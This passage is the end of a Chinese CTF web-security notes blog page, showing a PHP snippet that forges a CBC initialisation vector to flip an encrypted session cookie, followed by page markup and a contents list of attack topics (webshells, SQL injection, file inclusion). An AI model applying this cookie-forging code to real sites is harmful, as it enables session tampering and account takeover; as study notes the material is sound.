class="variable">$res</span>=base64_decode(<span class="string">&#x27;yeiydaYLG5RNzOPWaQgOkG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;</span>);	<span class="comment">//这里放burp放回的base64数据</span></span><br><span class="line"><span class="variable">$iv</span>=base64_decode(urldecode(<span class="string">&#x27;TD9FI%2FvbrZn%2FSjbSD9bfSQ%3D%3D&#x27;</span>)); <span class="comment">//这里放cookie中的iv</span></span><br><span class="line"><span class="variable">$plaintext</span>=<span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span>;</span><br><span class="line"><span class="variable">$new_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span> ++)&#123;</span><br><span class="line">    <span class="variable">$new_iv</span>=<span class="variable">$new_iv</span>.chr(ord(<span class="variable">$iv</span>[<span class="variable">$i</span>])^ord(<span class="variable">$res</span>[<span class="variable">$i</span>])^ord(<span class="variable">$plaintext</span>[<span class="variable">$i</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span class="variable">$new_iv</span>));</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/kyriota.github.io/css/spoiler.css" type="text/css"><script src="/kyriota.github.io/js/spoiler.js" type="text/javascript" async></script>	  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/kyriota.github.io/2021/03/24/社工-初步收集/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/kyriota.github.io/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>
	
	<!-- comment -->
	
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2021-03-16 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/kyriota.github.io/categories/Web/">Web<span>5</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/kyriota.github.io/tags/Web/">Web<span>5</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#PHP-amp-HTTP"><span class="toc-article-text">PHP&amp;HTTP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#cookie-session-token"><span class="toc-article-text">cookie,session,token</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#HEADER"><span class="toc-article-text">HEADER</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PHP%E6%A0%87%E7%AD%BE%E5%86%99%E6%B3%95"><span class="toc-article-text">PHP标签写法</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9D%BE%E6%95%A3%E6%AF%94%E8%BE%83"><span class="toc-article-text">松散比较</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#MD5%E7%A2%B0%E6%92%9E%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-article-text">MD5碰撞与绕过</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-article-text">超全局变量</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE-regex"><span class="toc-article-text">正则表达-regex</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-article-text">一句话木马</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#swp%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="toc-article-text">.swp备份文件</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">文件包含漏洞</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8"><span class="toc-article-text">反序列化逃逸</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PHP%E5%A4%AA%E6%80%AA%E4%BA%86"><span class="toc-article-text">PHP太怪了</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%98%E9%87%8F%E5%A5%97%E5%8F%98%E9%87%8F"><span class="toc-article-text">变量套变量</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%98%E9%87%8F%E5%A5%97%E5%87%BD%E6%95%B0"><span class="toc-article-text">变量套函数</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#PHP-func-DICT"><span class="toc-article-text">PHP func DICT</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#SQL"><span class="toc-article-text">SQL</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#MySQL%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-article-text">MySQL基础命令</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#MySQL-DICT"><span class="toc-article-text">MySQL DICT</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#information-schema"><span class="toc-article-text">information_schema</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-article-text">基于约束的攻击</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SQL%E6%9F%A5%E8%AF%A2%E4%B8%8E%E6%AF%94%E8%BE%83"><span class="toc-article-text">SQL查询与比较</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%87-%E8%83%BD-%E9%92%A5-%E5%8C%99"><span class="toc-article-text">万 能 钥 匙</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-article-text">宽字节注入</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-article-text">盲注</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5"><span class="toc-article-text">预处理语句</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E2%9D%80%E8%8A%B1%E5%BC%8F%E7%BB%95%E8%BF%87%E2%9D%80"><span class="toc-article-text">❀花式绕过❀</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#web%E6%A1%86%E6%9E%B6"><span class="toc-article-text">web框架</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#python%E6%A1%86%E6%9E%B6"><span class="toc-article-text">python框架</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#flask"><span class="toc-article-text">flask</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#tornado"><span class="toc-article-text">tornado</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PHP%E6%A1%86%E6%9E%B6"><span class="toc-article-text">PHP框架</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#FatFreeFramework"><span class="toc-article-text">FatFreeFramework</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#git"><span class="toc-article-text">git</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#git%E5%9F%BA%E7%A1%80"><span class="toc-article-text">git基础</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#git%E6%B3%84%E6%BC%8F"><span class="toc-article-text">git泄漏</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Linux"><span class="toc-article-text">Linux</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Linux%E5%9F%BA%E7%A1%80"><span class="toc-article-text">Linux基础</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E2%9D%80%E8%8A%B1%E5%BC%8FcatFlag%E2%9D%80"><span class="toc-article-text">❀花式catFlag❀</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Tool"><span class="toc-article-text">Tool</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#sqlmap"><span class="toc-article-text">sqlmap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#cURL"><span class="toc-article-text">cURL</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#pip%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC%E7%9A%84%E5%8C%85"><span class="toc-article-text">pip指定版本的包</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#ENCRYPT"><span class="toc-article-text">ENCRYPT</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CBC%E5%AD%97%E7%AC%A6%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB"><span class="toc-article-text">CBC字符翻转攻击</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>
		

</div><!-- row -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2021 KYRIOTA
  
      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.    
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/kyriota.github.io/js/jquery.imagesloaded.min.js"></script>
<script src="/kyriota.github.io/js/gallery.js"></script>
<script src="/kyriota.github.io/js/bootstrap.min.js"></script>
<script src="/kyriota.github.io/js/main.js"></script>
<script src="/kyriota.github.io/js/search.js"></script> 


<link rel="stylesheet" href="/kyriota.github.io/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/kyriota.github.io/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/kyriota.github.io/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
